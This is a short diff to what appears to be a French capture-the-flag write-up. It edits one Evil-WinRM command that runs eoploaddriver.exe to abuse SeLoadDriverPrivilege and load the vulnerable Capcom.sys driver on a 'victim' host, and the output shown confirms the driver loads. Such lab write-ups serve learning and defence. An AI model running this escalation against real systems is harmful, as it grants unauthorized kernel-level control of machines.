@@ -281,7 +281,7 @@ J'upload le driver et les deux codes compilés.
 Je charge le driver Capcom.sys sur la victime.
 
 ```bash
-*Evil-WinRM* PS C:\test> .\eoploaddriver.exe System\CurrentControlSet\MyService c:\test\Capcom.sys
+*Evil-WinRM* PS C:\test> eoploaddriver.exe System\CurrentControlSet\MyService c:\test\Capcom.sys
 [+] Enabling SeLoadDriverPrivilege
 [+] SeLoadDriverPrivilege Enabled
 [+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
